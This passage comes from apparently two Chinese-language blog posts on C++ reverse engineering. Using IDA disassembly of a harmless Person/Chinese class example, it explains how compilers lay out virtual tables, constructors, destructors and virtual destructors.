[ebp-4]    ; 返回值设置为this指针.text:0040114B                 mov     esp, ebp.text:0040114D                 pop     ebp.text:0040114E                 retn.text:0040114E sub_401130      endp_DWORD *__thiscall sub_401130(_DWORD *this)&#123;  sub_401080(this);  *this = &amp;off_402124;  return this;&#125;//Person的构造函数.text:00401080 ; std::shared_mutex *__thiscall sub_401080(std::shared_mutex *this).text:00401080 sub_401080      proc near               ; CODE XREF: sub_401130+A↓p.text:00401080.text:00401080 var_4           = dword ptr -4.text:00401080.text:00401080                 push    ebp             ; Person的构造函数.text:00401081                 mov     ebp, esp.text:00401083                 push    ecx.text:00401084                 mov     [ebp-4], ecx.text:00401087                 mov     eax, [ebp-4].text:0040108A                 mov     dword ptr [eax], offset off_402130 ; 将虚表设置为Person类的虚表.text:00401090                 mov     ecx, [ebp-4]    ; this，虚表是父类的，可以直接调用父类虚函数.text:00401093                 call    ??1shared_mutex@std@@QAE@XZ ; 调用showSpeak函数.text:00401098                 mov     eax, [ebp-4]    ; 返回值设置为this指针.text:0040109B                 mov     esp, ebp.text:0040109D                 pop     ebp.text:0040109E                 retn.text:0040109E sub_401080      endpstd::shared_mutex *__thiscall sub_401080(std::shared_mutex *this)&#123;  *(_DWORD *)this = &amp;off_402130;  std::shared_mutex::~shared_mutex(this);  return this;&#125;//Chinese的析构函数.text:00401150 ; int __thiscall sub_401150(_DWORD *this).text:00401150 sub_401150      proc near               ; CODE XREF: sub_401190+A↓p.text:00401150                                         ; _main+22↓p.text:00401150.text:00401150 var_4           = dword ptr -4.text:00401150.text:00401150                 push    ebp             ; Chinese的析构函数.text:00401151                 mov     ebp, esp.text:00401153                 push    ecx.text:00401154                 mov     [ebp-4], ecx.text:00401157                 mov     eax, [ebp-4]    ; 返回值设置为this指针.text:0040115A                 mov     dword ptr [eax], offset off_402124 ; 将虚表设置为Chinese类的虚表.text:00401160                 mov     ecx, [ebp-4]    ; 传递this指针.text:00401163                 call    sub_4010A0      ; 调用父类Person的析构函数.text:00401168                 mov     esp, ebp.text:0040116A                 pop     ebp.text:0040116B                 retn.text:0040116B sub_401150      endpint __thiscall sub_401150(_DWORD *this)&#123;  *this = &amp;off_402124;  return sub_4010A0(this);&#125;//Person析构函数.text:004010A0 ; void __thiscall sub_4010A0(std::shared_mutex *this).text:004010A0 sub_4010A0      proc near               ; CODE XREF: sub_401100+A↓p.text:004010A0                                         ; sub_401150+13↓p.text:004010A0.text:004010A0 var_10          = dword ptr -10h.text:004010A0 var_C           = dword ptr -0Ch.text:004010A0 arg_4           = dword ptr  0Ch.text:004010A0.text:004010A0 ; FUNCTION CHUNK AT .text:00401EC0 SIZE 0000001D BYTES.text:004010A0.text:004010A0 ; __unwind &#123; // SEH_4010A0.text:004010A0                 push    ebp             ; Person析构函数.text:004010A1                 mov     ebp, esp.text:004010A3                 push    0FFFFFFFFh.text:004010A5                 push    offset SEH_4010A0.text:004010AA                 mov     eax, large fs:0.text:004010B0                 push    eax.text:004010B1                 push    ecx.text:004010B2                 mov     eax, ___security_cookie.text:004010B7                 xor     eax, ebp.text:004010B9                 push    eax.text:004010BA                 lea     eax, [ebp-0Ch].text:004010BD                 mov     large fs:0, eax.text:004010C3                 mov     [ebp-10h], ecx.text:004010C6                 mov     eax, [ebp-10h]  ; 返回值设置为this指针.text:004010C9                 mov     dword ptr [eax], offset off_402130 ; 将虚表设置为Person类的虚表.text:004010C9                                         ; 因为当前虚表指针指向了子类虚表，所以需要重新修改为父类虚表，防止调用到子类的虚函数.text:004010CF                 mov     ecx, [ebp-10h]  ; this，虚表是父类的，可以直接调用父类虚函数.text:004010D2                 call    ??1shared_mutex@std@@QAE@XZ ; 调用showSpeak函数.text:004010D7                 mov     ecx, [ebp-0Ch].text:004010DA                 mov     large fs:0, ecx.text:004010E1                 pop     ecx.text:004010E2                 mov     esp, ebp.text:004010E4                 pop     ebp.text:004010E5                 retn.text:004010E5 ; &#125; // starts at 4010A0.text:004010E5 sub_4010A0      endpvoid __thiscall sub_4010A0(std::shared_mutex *this)&#123;  *(_DWORD *)this = &amp;off_402130;  std::shared_mutex::~shared_mutex(this);&#125;\n\n在上面代码的子类构造函数代码中，先调用了父类的构造函数，然后设置虚表指针为当前类的虚表首地址。而析构函数中的顺序却与构造函数相反，先设置虚表指针为当前类的虚表首地址，然后调用父类的析构函数，其构造和析构的过程描述如下：\n构造：基类→基类的派生类→……→当前类。\n析构：当前类→基类的派生类→……→基类。\n在上面代码中，析构函数被定义为虚函数。为什么要将析构函数定义为虚函数呢？\n因为可以使用父类指针保存子类对象的首地址，所以当使用父类指针指向子类堆对象时，就会出问题。当使用delete函数释放对象的空间时，如果析构函数没有被定义为虚函数，那么编译器会按指针的类型调用父类的析构函数，从而引发错误。而使用了虚析构函数后，会访问虚表并调用对象的析构函数。两种析构函数的调用过程如以下代码所示。\n12345678910111213141516//没有声明为虚析构函数Person * p = new Chinese;delete p; //部分代码分析略00D85714 mov ecx,dword ptr [ebp+FFFFFF08h] ;直接调用父类的析构函数00D8571A call 00D81456// 声明为虚析构函数Person * p = new Chinese;delete p; //部分代码分析略000B5716 mov ecx,dword ptr [ebp+FFFFFF08h] ;获取p并保存至ecx000B571C mov edx,dword ptr [ecx] ;取得虚表指针000B571E mov ecx,dword ptr [ebp+FFFFFF08h] ;传递this指针000B5724 mov eax,dword ptr [edx] ;间接调用虚析构函数000B5726 call eax\n\n以上代码对普通析构函数与虚析构函数进行了对比，说明了类在有了派生与继承关系后，需要声明虚析构函数的原因。对于没有派生和继承关系的类结构，是否将析构函数声明为虚析构函数并不会影响调用的过程，但是在编写析构函数时应养成习惯，无论当前是否有派生或继承关系，都应将析构函数声明为虚析构函数，以防止将来更新和维护代码时发生析构函数的错误调用。\n如何识别代码中类与类之间的关系最好的办法还是先定位构造函数，有了构造函数就可根据构造的先后顺序得到与之有关的其他类。\n在构造函数中只构造自己的类很明显是基类，对于构造函数中存在调用父类构造函数的情况，可利用虚表，在IDA中使用引用参考的功能，便可得到所有的构造函数和析构函数，进而得到它们之间的派生和继承关系。下面利用IDA进行分析实战：\n12345678910111213141516171819202122232425262728293031323334353637383940#include &lt;stdio.h&gt;#include &lt;string.h&gt;#pragma warning(disable : 4996)class Person &#123; //基类：人类public:\tPerson() &#123;\t\tshowSpeak(); //注意，构造函数调用了虚函数\t&#125;\tvirtual ~Person() &#123;\t\tshowSpeak(); //注意，析构函数调用了虚函数\t&#125;\tvirtual void showSpeak() &#123;\t\t//在这个函数里调用了其他的虚函数getClassName();\t\tprintf(&quot;%s::showSpeak()\\n&quot;, getClassName());\t\treturn;\t&#125;\tvirtual const char* getClassName()\t&#123;\t\treturn &quot;Person&quot;;\t&#125;&#125;;class Chinese : public Person &#123; //中国人，继承自&quot;人&quot;类public:\tChinese() &#123;\t\tshowSpeak();\t&#125;\tvirtual ~Chinese() &#123;\t\tshowSpeak();\t&#125;\tvirtual const char* getClassName() &#123;\t\treturn &quot;Chinese&quot;;\t&#125;&#125;;int main(int argc, char* argv[]) &#123;\tPerson* p = new Chinese;\tp-&gt;showSpeak();\tdelete p;\treturn 0;&#125;\n\nmain函数123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101.text:00401260 ; int __cdecl main(int argc, const char **argv, const char **envp).text:00401260 _main           proc near               ; CODE XREF: __scrt_common_main_seh(void)+F5↓p.text:00401260.text:00401260 var_24          = dword ptr -24h.text:00401260 var_20          = dword ptr -20h.text:00401260 var_1C          = dword ptr -1Ch.text:00401260 Block           = dword ptr -18h.text:00401260 var_14          = dword ptr -14h.text:00401260 var_10          = dword ptr -10h.text:00401260 var_C           = dword ptr -0Ch.text:00401260 var_4           = dword ptr -4.text:00401260 argc            = dword ptr  8.text:00401260 argv            = dword ptr  0Ch.text:00401260 envp            = dword ptr  10h.text:00401260.text:00401260 ; FUNCTION CHUNK AT .text:00402190 SIZE 0000000F BYTES.text:00401260 ; FUNCTION CHUNK AT .text:004021A4 SIZE 0000001D BYTES.text:00401260.text:00401260 ; __unwind &#123; // _main_SEH.text:00401260                 push    ebp.text:00401261                 mov     ebp, esp.text:00401263                 push    0FFFFFFFFh.text:00401265                 push    offset _main_SEH.text:0040126A                 mov     eax, large fs:0.text:00401270                 push    eax.text:00401271                 sub     esp, 18h.text:00401274                 mov     eax, ___security_cookie.text:00401279                 xor     eax, ebp.text:0040127B                 push    eax.text:0040127C                 lea     eax, [ebp-0Ch].text:0040127F                 mov     large fs:0, eax.text:00401285                 push    4               ; Size.text:00401287                 call    ??2@YAPAXI@Z    ; operator new(uint)，申请4字节堆空间.text:0040128C                 add     esp, 4          ; 平衡new调用的参数.text:0040128F                 mov     [ebp-18h], eax  ; [ebp-18h]保存new调用的返回值.text:00401292 ;   try &#123;.text:00401292                 mov     dword ptr [ebp-4], 0.text:00401299                 cmp     dword ptr [ebp-18h], 0 ; 检查new返回值的代码，若返回值为0，则跳过构造函数的调用.text:0040129D                 jz      short loc_4012AC.text:0040129F                 mov     ecx, [ebp-18h]  ; 如果new返回值不为0，则ecx保存堆地址.text:004012A2                 call    sub_401160      ; 调用Chinese构造函数.text:004012A7                 mov     [ebp-1Ch], eax  ; 此时返回值为Chinese的虚表.text:004012AA                 jmp     short loc_4012B3.text:004012AC ; ---------------------------------------------------------------------------.text:004012AC.text:004012AC loc_4012AC:                             ; CODE XREF: _main+3D↑j.text:004012AC                 mov     dword ptr [ebp-1Ch], 0.text:004012B3.text:004012B3 loc_4012B3:                             ; CODE XREF: _main+4A↑j.text:004012B3                 mov     eax, [ebp-1Ch].text:004012B6                 mov     [ebp-20h], eax.text:004012B6 ;   &#125; // starts at 401292.text:004012B9                 mov     dword ptr [ebp-4], 0FFFFFFFFh.text:004012C0                 mov     ecx, [ebp-20h].text:004012C3                 mov     [ebp-10h], ecx.text:004012C6                 mov     edx, [ebp-10h].text:004012C9                 mov     eax, [edx].text:004012CB                 mov     ecx, [ebp-10h]  ; 虚表是Chinese的.text:004012CE                 mov     edx, [eax+4]    ; 定位到Chinese的showSpeak函数.text:004012D1                 call    edx             ; 调用Chinese的showSpeak函数.text:004012D3                 mov     eax, [ebp-10h].text:004012D6                 mov     [ebp-14h], eax.text:004012D9                 cmp     dword ptr [ebp-14h], 0.text:004012DD                 jz      short loc_4012F2.text:004012DF                 push    1.text:004012E1                 mov     ecx, [ebp-14h].text:004012E4                 mov     edx, [ecx].text:004012E6                 mov     ecx, [ebp-14h].text:004012E9                 mov     eax, [edx].text:004012EB                 call    eax             ; 调用Chinese析构函数.text:004012ED                 mov     [ebp-24h], eax.text:004012F0                 jmp     short loc_4012F9.text:004012F2 ; ---------------------------------------------------------------------------.text:004012F2.text:004012F2 loc_4012F2:                             ; CODE XREF: _main+7D↑j.text:004012F2                 mov     dword ptr [ebp-24h], 0.text:004012F9.text:004012F9 loc_4012F9:                             ; CODE XREF: _main+90↑j.text:004012F9                 xor     eax, eax.text:004012FB                 mov     ecx, [ebp-0Ch].text:004012FE                 mov     large fs:0, ecx.text:00401305                 pop     ecx.text:00401306                 mov     esp, ebp.text:00401308                 pop     ebp.text:00401309                 retn.text:00401309 ; &#125; // starts at 401260.text:00401309 _main           endpint __cdecl main(int argc, const char **argv, const char **envp)&#123;  int v4; // [esp+Ch] [ebp-1Ch]  if ( operator new(4u) )    v4 = sub_401160();  else    v4 = 0;  (*(void (__thiscall **)(int))(*(_DWORD *)v4 + 4))(v4);  if ( v4 )    (**(void (__thiscall ***)(int, int))v4)(v4, 1);  return 0;&#125;\n\n从main函数的流程可以看到，会先调用new函数创建堆，然后调用Chinese的构造函数进行初始化操作，再调用Chinese的showSpeak函数，最后调用Chinese的析构函数释放相关资源，下面依次查看这些函数\nChinese的构造函数123456789101112131415161718192021222324252627282930313233343536373839404142434445.text:00401160 ; _DWORD *__thiscall sub_401160(_DWORD *this).text:00401160 sub_401160      proc near               ; CODE XREF: _main+42↓p.text:00401160.text:00401160 var_10          = dword ptr -10h.text:00401160 var_C           = dword ptr -0Ch.text:00401160 var_4           = dword ptr -4.text:00401160 arg_4           = dword ptr  0Ch.text:00401160.text:00401160 ; FUNCTION CHUNK AT .text:00402160 SIZE 00000008 BYTES.text:00401160 ; FUNCTION CHUNK AT .text:0040216D SIZE 0000001D BYTES.text:00401160.text:00401160 ; __unwind &#123; // SEH_401160.text:00401160                 push    ebp             ; Chinese构造函数.text:00401161                 mov     ebp, esp.text:00401163                 push    0FFFFFFFFh.text:00401165                 push    offset SEH_401160.text:0040116A                 mov     eax, large fs:0.text:00401170                 push    eax.text:00401171                 push    ecx.text:00401172                 mov     eax, ___security_cookie.text:00401177                 xor     eax, ebp.text:00401179                 push    eax.text:0040117A                 lea     eax, [ebp-0Ch].text:0040117D                 mov     large fs:0, eax.text:00401183                 mov     [ebp-10h], ecx.text:00401186                 mov     ecx, [ebp-10h].text:00401189                 call    sub_401080      ; 调用父类Person构造函数.text:0040118E ;   try &#123;.text:0040118E                 mov     dword ptr [ebp-4], 0.text:00401195                 mov     eax, [ebp-10h].text:00401198                 mov     dword ptr [eax], offset ??_7Chinese@@6B@ ; const Chinese::`vftable&#x27;.text:00401198                                         ; 将虚表设置为Chinese类的虚表.text:0040119E                 mov     ecx, [ebp-10h]  ; this，虚表是Chinese的，可以直接调用Chinese的虚函数.text:004011A1                 call    showSpeak       ; 调用Chinese的showSpeak.text:004011A1 ;   &#125; // starts at 40118E.text:004011A6                 mov     dword ptr [ebp-4], 0FFFFFFFFh.text:004011AD                 mov     eax, [ebp-10h].text:004011B0                 mov     ecx, [ebp-0Ch].text:004011B3                 mov     large fs:0, ecx.text:004011BA                 pop     ecx.text:004011BB                 mov     esp, ebp.text:004011BD                 pop     ebp.text:004011BE                 retn.text:004011BE ; &#125; // starts at 401160.text:004011BE sub_401160      endp\n\n在Chinese构造函数中，会先调用父类Person构造函数，然后再将虚表设置为自身（Chinese类）的虚表，并调用showSpeak函数\n父类Person构造函数12345678910111213141516171819.text:00401080 ; _DWORD *__thiscall sub_401080(_DWORD *this).text:00401080 sub_401080      proc near               ; CODE XREF: sub_401160+29↓p.text:00401080.text:00401080 var_4           = dword ptr -4.text:00401080.text:00401080                 push    ebp             ; Person构造函数.text:00401081                 mov     ebp, esp.text:00401083                 push    ecx.text:00401084                 mov     [ebp-4], ecx.text:00401087                 mov     eax, [ebp-4].text:0040108A                 mov     dword ptr [eax], offset ??_7Person@@6B@ ; const Person::`vftable&#x27;.text:0040108A                                         ; 将虚表设置为Person类的虚表.text:00401090                 mov     ecx, [ebp-4]    ; this，虚表是父类的，可以直接调用父类虚函数.text:00401093                 call    showSpeak       ; 调用父类的showSpeak函数.text:00401098                 mov     eax, [ebp-4].text:0040109B                 mov     esp, ebp.text:0040109D                 pop     ebp.text:0040109E                 retn.text:0040109E sub_401080      endp\n\n在父类Person构造函数中，首先将虚表设置为Person类的虚表，然后直接调用此类的showSpeak函数\n我们来看看Person类的虚表??_7Person@@6B@里面的内容\n12345; const Person::`vftable&#x27;.rdata:004031B8 ??_7Person@@6B@ dd offset sub_401130    ; DATA XREF: sub_401080+A↑o.rdata:004031B8                                         ; sub_4010A0+29↑o.rdata:004031BC                 dd offset sub_4010F0.rdata:004031C0                 dd offset sub_401120\n\nIDA 以 注 释 的 形 式 给 出 了 反 汇 编 代 码 中 所 有 引 用 了 标 号 ??_7Person@@6B@ 的 指 令 地 址 ， 供 我 们 分 析 时 参 考 。 如 “DATAXREF: sub_401080+A↑”，表示sub_401080函数的首地址偏移0Ah字节处的指令引用了标号??_7Person@@6B@，最后的上箭头“↑”表示引用处的地址在当前标号的上面，也就是说引用处的地址值比这个标号的地址值小。\n接着观察sub_401080和sub_4010A0中的内容，双击后可以看到，这两个名称都是函数名称，可证实??_7Person@@6B@是函数指针数组的首地址，而且其中每个函数都有对ecx的引用。在引用前没有给ecx赋值，说明这两个函数都是将ecx作为参数传递的。结合0040108A 处 的 指 令 “mov     dword ptr [eax], offset ??_7Person@@6B@”，其中eax保存的是new调用申请的堆空间首地址，这条指令在首地址处放置了函数指针数组的地址。\n结合以上种种信息，我们可以认定，eax中的地址是对象的地址，而函数指针数组就是虚表。退一步讲，即使源码不是这样，我们按此还原后的C++代码在功能和内存布局上也是等价的。\n父类Person构造函数中调用的showSpeak函数1234567891011121314151617181920212223.text:004010F0 ; int __thiscall showSpeak(void *this).text:004010F0 showSpeak       proc near               ; CODE XREF: sub_401080+13↑p.text:004010F0                                         ; sub_4010A0+32↑p ....text:004010F0.text:004010F0 var_4           = dword ptr -4.text:004010F0.text:004010F0                 push    ebp             ; showSpeak函数.text:004010F1                 mov     ebp, esp.text:004010F3                 push    ecx.text:004010F4                 mov     [ebp-4], ecx.text:004010F7                 mov     eax, [ebp-4].text:004010FA                 mov     edx, [eax].text:004010FC                 mov     ecx, [ebp-4].text:004010FF                 mov     eax, [edx+8]    ; 定位到getClassName函数.text:00401102                 call    eax             ; 调用getClassName函数.text:00401104                 push    eax             ; char.text:00401105                 push    offset Format   ; &quot;%s::showSpeak()\\n&quot;.text:0040110A                 call    sub_401040.text:0040110F                 add     esp, 8.text:00401112                 mov     esp, ebp.text:00401114                 pop     ebp.text:00401115                 retn.text:00401115 showSpeak       endp\n\nshowSpeak函数中主要是调用getClassName函数，但是调的是谁的getClassName函数还要看此时存的是谁的虚表，在父类Person构造函数中，将虚表设置为了Person类的虚表，所以此时调用的是父类Person的getClassName函数\n而对于Person的虚表，根据Person类中虚函数的定义，sub_401130是Person的析构函数，sub_4010F0是Person的showSpeak函数，sub_401120是Person的getClassName函数。\n123456789101112131415161718virtual ~Person() &#123;\t\tshowSpeak(); //注意，析构函数调用了虚函数&#125;virtual void showSpeak() &#123;\t//在这个函数里调用了其他的虚函数getClassName();\tprintf(&quot;%s::showSpeak()\\n&quot;, getClassName());\treturn;&#125;virtual const char* getClassName()&#123;\treturn &quot;Person&quot;;&#125;; const Person::`vftable&#x27;.rdata:004031B8 ??_7Person@@6B@ dd offset sub_401130    ; DATA XREF: sub_401080+A↑o.rdata:004031B8                                         ; sub_4010A0+29↑o.rdata:004031BC                 dd offset sub_4010F0.rdata:004031C0                 dd offset sub_401120\n\n查看sub_401120，可以看到确实是上面的分析\n12345678910111213141516171819.text:00401120 ; const char *sub_401120().text:00401120 sub_401120      proc near               ; DATA XREF: .rdata:004031C0↓o.text:00401120.text:00401120 var_4           = dword ptr -4.text:00401120.text:00401120                 push    ebp.text:00401121                 mov     ebp, esp.text:00401123                 push    ecx.text:00401124                 mov     [ebp+var_4], ecx.text:00401127                 mov     eax, offset aPerson ; &quot;Person&quot;.text:0040112C                 mov     esp, ebp.text:0040112E                 pop     ebp.text:0040112F                 retn.text:0040112F sub_401120      endpconst char *sub_401120()&#123;  return &quot;Person&quot;;&#125;\n\nChinese类的虚表查看Chinese类的虚表??_7Chinese@@6B@，再根据Chinese类中虚函数的定义，sub_401230是Chinese的析构函数，sub_4010F0是Chinese的showSpeak函数，sub_401220是Chinese的getClassName函数。可以看到，Chinese类中并没有定义showSpeak函数，所以其虚表中直接填写父类Person的showSpeak函数地址\n123456789101112virtual ~Chinese() &#123;\tshowSpeak();&#125;virtual const char* getClassName() &#123;\treturn &quot;Chinese&quot;;&#125;.rdata:004031A8 ; const Chinese::`vftable&#x27;.rdata:004031A8 ??_7Chinese@@6B@ dd offset sub_401230   ; DATA XREF: sub_401160+38↑o.rdata:004031A8                                         ; sub_4011C0+29↑o.rdata:004031AC                 dd offset sub_4010F0.rdata:004031B0                 dd offset sub_401220\n\n查看sub_401220，可以看到确实是上面的分析\n12345678910111213141516171819.text:00401220 ; const char *sub_401220().text:00401220 sub_401220      proc near               ; DATA XREF: .rdata:004031B0↓o.text:00401220.text:00401220 var_4           = dword ptr -4.text:00401220.text:00401220                 push    ebp.text:00401221                 mov     ebp, esp.text:00401223                 push    ecx.text:00401224                 mov     [ebp+var_4], ecx.text:00401227                 mov     eax, offset aChinese ; &quot;Chinese&quot;.text:0040122C                 mov     esp, ebp.text:0040122E                 pop     ebp.text:0040122F                 retn.text:0040122F sub_401220      endpconst char *sub_401220()&#123;  return &quot;Chinese&quot;;&#125;\n\n\n\nChinese的析构函数根据前面分析的Chinese的虚表得出sub_401230是Chinese的析构函数，sub_4010F0是Chinese的showSpeak函数，sub_401220是Chinese的getClassName函数\n123456789101112virtual ~Chinese() &#123;\tshowSpeak();&#125;virtual const char* getClassName() &#123;\treturn &quot;Chinese&quot;;&#125;.rdata:004031A8 ; const Chinese::`vftable&#x27;.rdata:004031A8 ??_7Chinese@@6B@ dd offset sub_401230   ; DATA XREF: sub_401160+38↑o.rdata:004031A8                                         ; sub_4011C0+29↑o.rdata:004031AC                 dd offset sub_4010F0.rdata:004031B0                 dd offset sub_401220\n\n查看sub_401230，析构部分主要在sub_4011C0函数中：\n123456789101112131415161718192021222324252627.text:00401230 ; _DWORD *__thiscall sub_401230(_DWORD *this, char).text:00401230 sub_401230      proc near               ; DATA XREF: .rdata:const Chinese::`vftable&#x27;↓o.text:00401230.text:00401230 Block           = dword ptr -4.text:00401230 arg_0           = dword ptr  8.text:00401230.text:00401230                 push    ebp             ; Chinese析构函数.text:00401231                 mov     ebp, esp.text:00401233                 push    ecx.text:00401234                 mov     [ebp-4], ecx.text:00401237                 mov     ecx, [ebp-4].text:0040123A                 call    sub_4011C0      ; Chinese析构函数.text:0040123F                 mov     eax, [ebp+arg_0].text:00401242                 and     eax, 1.text:00401245                 jz      short loc_401255.text:00401247                 push    4.text:00401249                 mov     ecx, [ebp+Block].text:0040124C                 push    ecx             ; Block.text:0040124D                 call    sub_401348.text:00401252                 add     esp, 8.text:00401255.text:00401255 loc_401255:                             ; CODE XREF: sub_401230+15↑j.text:00401255                 mov     eax, [ebp+Block].text:00401258                 mov     esp, ebp.text:0040125A                 pop     ebp.text:0040125B                 retn    4.text:0040125B sub_401230      endp\n\n查看sub_4011C0函数：\n首先会将虚表设置为Chinese类的虚表，然后调用Chinese的showSpeak函数，最后再调用父类Person析构函数\n12345678910111213141516171819202122232425262728293031323334353637.text:004011C0 ; int __thiscall sub_4011C0(_DWORD *this).text:004011C0 sub_4011C0      proc near               ; CODE XREF: sub_401230+A↓p.text:004011C0.text:004011C0 var_10          = dword ptr -10h.text:004011C0 var_C           = dword ptr -0Ch.text:004011C0.text:004011C0 ; FUNCTION CHUNK AT .text:00402140 SIZE 0000001D BYTES.text:004011C0.text:004011C0 ; __unwind &#123; // SEH_4011C0.text:004011C0                 push    ebp.text:004011C1                 mov     ebp, esp.text:004011C3                 push    0FFFFFFFFh.text:004011C5                 push    offset SEH_4011C0.text:004011CA                 mov     eax, large fs:0.text:004011D0                 push    eax.text:004011D1                 push    ecx.text:004011D2                 mov     eax, ___security_cookie.text:004011D7                 xor     eax, ebp.text:004011D9                 push    eax.text:004011DA                 lea     eax, [ebp-0Ch].text:004011DD                 mov     large fs:0, eax.text:004011E3                 mov     [ebp-10h], ecx.text:004011E6                 mov     eax, [ebp-10h].text:004011E9                 mov     dword ptr [eax], offset ??_7Chinese@@6B@ ; const Chinese::`vftable&#x27;.text:004011E9                                         ; 将虚表设置为Chinese类的虚表.text:004011EF                 mov     ecx, [ebp-10h]  ; 此时虚表存的是Chinese的虚表.text:004011F2                 call    sub_4010F0      ; 调用Chinese的showSpeak.text:004011F7                 mov     ecx, [ebp-10h].text:004011FA                 call    sub_4010A0      ; 调用父类Person析构函数.text:004011FF                 mov     ecx, [ebp-0Ch].text:00401202                 mov     large fs:0, ecx.text:00401209                 pop     ecx.text:0040120A                 mov     esp, ebp.text:0040120C                 pop     ebp.text:0040120D                 retn.text:0040120D ; &#125; // starts at 4011C0.text:0040120D sub_4011C0      endp\n\n父类Person析构函数首先会将虚表设置为Person类的虚表，然后调用Person的showSpeak函数\n12345678910111213141516171819202122232425262728293031323334353637.text:004010A0 ; int __thiscall sub_4010A0(_DWORD *this).text:004010A0 sub_4010A0      proc near               ; CODE XREF: sub_401130+A↓p.text:004010A0                                         ; sub_4011C0+3A↓p ....text:004010A0.text:004010A0 var_10          = dword ptr -10h.text:004010A0 var_C           = dword ptr -0Ch.text:004010A0 arg_4           = dword ptr  0Ch.text:004010A0.text:004010A0 ; FUNCTION CHUNK AT .text:00402140 SIZE 0000001D BYTES.text:004010A0.text:004010A0 ; __unwind &#123; // SEH_4011C0.text:004010A0                 push    ebp.text:004010A1                 mov     ebp, esp.text:004010A3                 push    0FFFFFFFFh.text:004010A5                 push    offset SEH_4011C0.text:004010AA                 mov     eax, large fs:0.text:004010B0                 push    eax.text:004010B1                 push    ecx.text:004010B2                 mov     eax, ___security_cookie.text:004010B7                 xor     eax, ebp.text:004010B9                 push    eax.text:004010BA                 lea     eax, [ebp-0Ch].text:004010BD                 mov     large fs:0, eax.text:004010C3                 mov     [ebp-10h], ecx.text:004010C6                 mov     eax, [ebp-10h].text:004010C9                 mov     dword ptr [eax], offset ??_7Person@@6B@ ; const Person::`vftable&#x27;.text:004010C9                                         ; 将虚表设置为Person类的虚表.text:004010CF                 mov     ecx, [ebp-10h]  ; 此时虚表存的是Person的虚表.text:004010D2                 call    sub_4010F0      ; 调用Person的showSpeak函数.text:004010D7                 mov     ecx, [ebp-0Ch].text:004010DA                 mov     large fs:0, ecx.text:004010E1                 pop     ecx.text:004010E2                 mov     esp, ebp.text:004010E4                 pop     ebp.text:004010E5                 retn.text:004010E5 ; &#125; // starts at 4010A0.text:004010E5 sub_4010A0      endp\n\n总结根据前面的分析可以得到派生关系，在构造函数中先填写父类的虚表，然 后 按 继 承 的 层 次 关 系 逐 层 填 写 子 类 的 虚 表\n","slug":"C++逆向——识别类和类之间的关系","date":"2023-02-15T12:11:27.000Z","categories_index":"","tags_index":"c++逆向","author_index":"0netry"},{"id":"cff45971697c57c78d8a68c46a85aef2","title":"虚函数","content":"虚函数是面向对象程序设计的关键组成部分。对于具有虚函数的类而言，构造函数和析构函数的识别过程更加简单。而且，在类中定义虚函数之后，如果没有提供构造函数，编译器会生成并提供默认的构造函数。\n对象的多态性需要通过虚表和虚表指针完成，虚表指针被定义在对象首地址处，因此虚函数必须作为成员函数使用。因为非成员函数没有this指针，所以无法获得虚表指针，进而无法获取虚表，也就无法访问虚函数。\n虚函数的机制在C++中，使用关键字virtual声明函数为虚函数。当类中定义有虚函数时，编译器会将该类中所有虚函数的首地址保存在一张地址表中，这张表被称为虚函数地址表，简称虚表。同时，编译器还会在类中添加一个隐藏数据成员，称为虚表指针。该指针保存着虚表的首地址，用于记录和查找虚函数。\n包含虚函数的类的定义及虚表指针的初始化过程12345678910111213141516171819#include &lt;stdio.h&gt;#include &lt;string.h&gt;#pragma warning(disable : 4996)class Person &#123;public:\tvirtual int getAge() &#123; //虚函数定义\t\treturn age;\t&#125;\tvirtual void setAge(int age) &#123; //虚函数定义\t\tthis-&gt;age = age;\t&#125;private:\tint age;&#125;;int main(int argc, char* argv[]) &#123;\tPerson person;\treturn 0;&#125;\n\nida汇编及伪代码视图：\n1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859//mian函数.text:00401040 ; int __cdecl main(int argc, const char **argv, const char **envp).text:00401040 _main           proc near               ; CODE XREF: __scrt_common_main_seh(void)+F5↓p.text:00401040.text:00401040 var_C           = byte ptr -0Ch.text:00401040 var_4           = dword ptr -4.text:00401040 argc            = dword ptr  8.text:00401040 argv            = dword ptr  0Ch.text:00401040 envp            = dword ptr  10h.text:00401040.text:00401040                 push    ebp.text:00401041                 mov     ebp, esp.text:00401043                 sub     esp, 0Ch.text:00401046                 mov     eax, ___security_cookie.text:0040104B                 xor     eax, ebp.text:0040104D                 mov     [ebp-4], eax.text:00401050                 lea     ecx, [ebp-0Ch]  ; 获取对象首地址.text:00401053                 call    sub_401070      ; 调用构造函数，类Person中并没有定义构造函数，此调用为默认构造函数.text:00401058                 xor     eax, eax.text:0040105A                 mov     ecx, [ebp+var_4].text:0040105D                 xor     ecx, ebp        ; StackCookie.text:0040105F                 call    @__security_check_cookie@4 ; __security_check_cookie(x).text:00401064                 mov     esp, ebp.text:00401066                 pop     ebp.text:00401067                 retn.text:00401067 _main           endpint __cdecl main(int argc, const char **argv, const char **envp)&#123;  char v4[8]; // [esp+0h] [ebp-Ch] BYREF  sub_401070(v4);  return 0;&#125;//默认构造函数.text:00401070 ; _DWORD *__thiscall sub_401070(_DWORD *this).text:00401070 sub_401070      proc near               ; CODE XREF: _main+13↑p.text:00401070.text:00401070 var_4           = dword ptr -4.text:00401070.text:00401070                 push    ebp             ; 默认构造函数分析.text:00401071                 mov     ebp, esp.text:00401073                 push    ecx.text:00401074                 mov     [ebp-4], ecx    ; [ebp-4] 存储this指针.text:00401077                 mov     eax, [ebp-4]    ; 取出this指针并保存到eax中，这个地址将会作为指针保存虚函数表的首地址中.text:0040107A                 mov     dword ptr [eax], offset ??_7Person@@6B@ ; const Person::`vftable&#x27;，取虚表的首地址，保存到虚表指针中.text:00401080                 mov     eax, [ebp-4]    ; 返回对象首地址.text:00401083                 mov     esp, ebp.text:00401085                 pop     ebp.text:00401086                 retn.text:00401086 sub_401070      endp_DWORD *__thiscall sub_401070(_DWORD *this)&#123;  *this = &amp;Person::`vftable&#x27;;  return 